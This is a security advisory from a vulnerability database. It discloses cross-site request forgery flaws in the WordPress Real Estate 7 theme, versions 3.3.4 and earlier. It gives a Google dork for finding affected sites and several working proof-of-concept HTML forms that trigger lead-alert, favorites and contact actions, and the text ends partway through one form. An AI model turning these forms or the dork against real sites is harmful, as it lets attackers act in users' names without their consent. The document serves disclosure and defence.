---
title: WordPress Real Estate 7 Theme < = 3.3.4 - Multiple Cross-Site Request Forgery (CSRF) Vulnerabilities
url: https://cxsecurity.com/issue/WLB-2023030008
source: CXSECURITY Database RSS Feed - CXSecurity.com
date: 2023-03-06
fetch_date: 2025-10-04T08:45:07.651710
---

# WordPress Real Estate 7 Theme < = 3.3.4 - Multiple Cross-Site Request Forgery (CSRF) Vulnerabilities

[![Home Page](https://cert.cx/cxstatic/images/12018/cxseci.png)](https://cxsecurity.com/)

* [Home](https://cxsecurity.com/)
* Bugtraq
  + [Full List](https://cxsecurity.com/wlb/)
  + [Only Bugs](https://cxsecurity.com/bugs/)
  + [Only Tricks](https://cxsecurity.com/tricks/)
  + [Only Exploits](https://cxsecurity.com/exploit/)
  + [Only Dorks](https://cxsecurity.com/dorks/)
  + [Only CVE](https://cxsecurity.com/cvelist/)
  + [Only CWE](https://cxsecurity.com/cwelist/)
  + [Fake Notes](https://cxsecurity.com/bogus/)
  + [Ranking](https://cxsecurity.com/best/1/)
* CVEMAP
  + [Full List](https://cxsecurity.com/cvemap/)
  + [Show Vendors](https://cxsecurity.com/cvevendors/)
  + [Show Products](https://cxsecurity.com/cveproducts/)
  + [CWE Dictionary](https://cxsecurity.com/allcwe/)
  + [Check CVE Id](https://cxsecurity.com/cve/)
  + [Check CWE Id](https://cxsecurity.com/cwe/)
* Search
  + [Bugtraq](https://cxsecurity.com/search/)
  + [CVEMAP](https://cxsecurity.com/search/cve/)
  + [By author](https://cxsecurity.com/search/author/)
  + [CVE Id](https://cxsecurity.com/cve/)
  + [CWE Id](https://cxsecurity.com/cwe/)
  + [By vendors](https://cxsecurity.com/cvevendors/)
  + [By products](https://cxsecurity.com/cveproducts/)
* RSS
  + [Bugtraq](https://cxsecurity.com/wlb/rss/all/)
  + [CVEMAP](https://cxsecurity.com/cverss/fullmap/)
  + [CVE Products](https://cxsecurity.com/cveproducts/)
  + [Bugs](https://cxsecurity.com/wlb/rss/vulnerabilities/)
  + [Exploits](https://cxsecurity.com/wlb/rss/exploit/)
  + [Dorks](https://cxsecurity.com/wlb/rss/dorks/)
* More
  + [cIFrex](http://cifrex.org/)
  + [Facebook](https://www.facebook.com/cxsec)
  + [Twitter](https://twitter.com/cxsecurity)
  + [Donate](https://cxsecurity.com/donate/)
  + [About](https://cxsecurity.com/wlb/about/)

* [Submit](https://cxsecurity.com/wlb/add/)

|  |  |  |  |
| --- | --- | --- | --- |
|  |  | |  | | --- | | **WordPress Real Estate 7 Theme <= 3.3.4 - Multiple Cross-Site Request Forgery (CSRF) Vulnerabilities** **2023.03.05**  **![ru](https://cert.cx/cxstatic/images/flags/ru.png) [FearZzZz](https://cxsecurity.com/author/FearZzZz/1/) **(RU)** ![ru](https://cert.cx/cxstatic/images/flags/ru.png)**  Risk: **Low**  Local: **No**  Remote: ****Yes****  CVE: **N/A**  CWE: **[CWE-352](https://cxsecurity.com/cwe/CWE-352 "Click to see CWE-352")**  **[**Dork:** inurl:/wp-content/themes/realestate-7/](https://cxsecurity.com/dorks/)** | |

==== [ Z://USB-00\_RESEARCH/WORDPRESS/ ] ============================================= [ 2023 ] ==
Report Title: WordPress Real Estate 7 Theme <= 3.3.4 - Multiple Cross-Site Request Forgery (CSRF) Vulnerabilities
Google Dork: inurl:/wp-content/themes/realestate-7/
Research Date: 2023-02-10
Researcher: FearZzZz [ https://fearzzzz.ru ]
Component Vendor: Contempo Themes [ https://contempothemes.com ]
Vulnerable Version: <= 3.3.4
Component Link: https://themeforest.net/item/wp-pro-real-estate-7-responsive-real-estate-wordpress-theme/12473778
CVSS Base Score: 6.3 (Medium)
CVSS Vector String: CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:L/I:L/A:L
OWASP Top 10: A01: 2021 – Broken Access Control
CWE: CWE-352
CVE: TBA
=================================================================================================
#### [ Description: ]
The Real Estate 7 theme for WordPress is vulnerable to Cross-Site Request Forgery (CSRF) in versions up to, and including, v3.3.4, because of missing and incorrect nonce validation on several functions. This vulnerability could allow an attacker to trick users into performing an action they didn't intend to perform under their current authentication.
#### [ Impact: ]
Impact of a CSRF vulnerability is related to the privileges of the target user. Depending on the nature of the action, an attacker might be able to change some data or gain full control over the user's account. If the compromised user has a privileged role (administrator, i.e.) within the application, then the attacker can gain full control over the application.
#### [ Proof-of-Concept | Lead Alert Creation: ]
```
<html>
<body>
<script>history.pushState('', '', '/')</script>
<form action="https://fearzzzz.ru/wp-admin/admin-ajax.php" method="POST">
<input type="hidden" name="action" value="ct&#95;email&#95;cron&#95;onoff" />
<input type="hidden" name="esetting" value="onsms" />
<input type="hidden" name="id" value="12" />
<input type="hidden" name="author&#95;id" value="22" />
<input type="submit" value="Submit request" />
</form>
</body>
</html>
```
#### [ Proof-of-Concept | Add Property to Favorites: ]
```
<html>
<body>
<script>history.pushState('', '', '/')</script>
<form action="https://fearzzzz.ru/our-properties/our-exclusive-listings/">
<input type="hidden" name="wpfpaction" value="add" />
<input type="hidden" name="postid" value="1005" />
<input type="hidden" name="ajax" value="1" />
<input type="submit" value="Submit request" />
</form>
</body>
</html>
```
#### [ Proof-of-Concept | Remove Property from Favorites: ]
```
<html>
<body>
<script>history.pushState('', '', '/')</script>
<form action="https://fearzzzz.ru/favorite-listings/">
<input type="hidden" name="wpfpaction" value="remove" />
<input type="hidden" name="page" value="1" />
<input type="hidden" name="postid" value="451" />
<input type="hidden" name="ajax" value="1" />
<input type="submit" value="Submit request" />
</form>
</body>
</html>
```
#### [ Proof-of-Concept | Contact / Information Request: ]
```
<html>
<body>
<script>history.pushState('', '', '/')</script>
<form action="https://fearzzzz.ru/wp-content/themes/realestate-7/includes/ajax-submit-favorites.php" method="POST">
<input type="hidden" name="ctsubject" value="Fear&#32;is&#32;Big&#32;Business" />
<input type="hidden" name="name" value="FearZzZz" />
<input type="hidden" name="email" value="fearzzzz&#64;tutanota&#46;com" />
<input type="hidden" name="ctphone" value="no" />
<input type="hidden" name="message" value="Fear&#32;is&#32;Big&#32;Business" />
<input type="hidden" name="ctyouremail" value="fearzzzz&#64;tutanota&#46;com" />
<input type="hidden" name="ctproperty" value="https&#58;&#47;&#47;fearzzzz&#46;ru" />
<input type="submit" value="Submit request" />
</form>
</body>
</html>
```
```
<html>
<body>
<script>history.pushState('', '', '/')</script>
<form action="https://fearzzzz.ru/wp-content/themes/realestate-7/includes/ajax-submit-listings.php" method="POST">
<input type="hidden" name="listing&#95;id" value="451" />
<input type="hidden" name="ctsubject" value="Fear&#32;is&#32;Big&#32;Business" />
<input type="hidden" name="name" value="FearZzZz" />
<input type="hidden" name="email" value="fearzzzz&#64;tutanota&#46;com" />
<input type="hidden" name="ctphone" value="" />
<input type="hidden" name="message" value="Fear&#32;is&#32;Big&#32;Business" />
<input type="hidden" name="ctyouremail" value="fearzzzz&#64;tutanota&#46;com" />
<input type="hidden" name="ctproperty" value="Z" />
<input type="hidden" name="ctlistingstreet" value="Z" />
<input type="hidden" name="ctlistingcity" value="Z" />
<input type="hidden" name="ctlistingstate" value="Z" />
<input type="hidden" name="ctlistingzip" value="Z" />
<input type="hidden" name="ctpermalink" value="https&#58;&#47;&#47;fearzzzz&#46;ru" />
<input type="hidden" name="ctlistingprice" value="Z" />
<input type="hidden" name="ctlistingsqft" value="Z" />
<input type="hidden" name="ctlistingbeds" value="" />
<input type="hidden" name="ctlistingbaths" value="" />
<input type="hidden" name="ctlistinglotsize" value="" />
<input type="hidden" name="ctlistingmlsnumber" value="" />
<input type="hidden" name="ctlistingpropertytype" value="Detached" />
<input type="submit" value="Submit request" />
</form>
</body>
</html>
```
#### [ Proof-of-Concept | Lead Alert Deletion: ]
```
<html>
<body>
<script>history.pushState('', '', '/')</script>
<form action="https://fearzzzz.ru/wp-admin/admin-ajax.php" method="POST">
<input type="hidden" name="action" value="ct&#95;delete&#95;search" />
<input type="hidden" name="property&#95;id" value...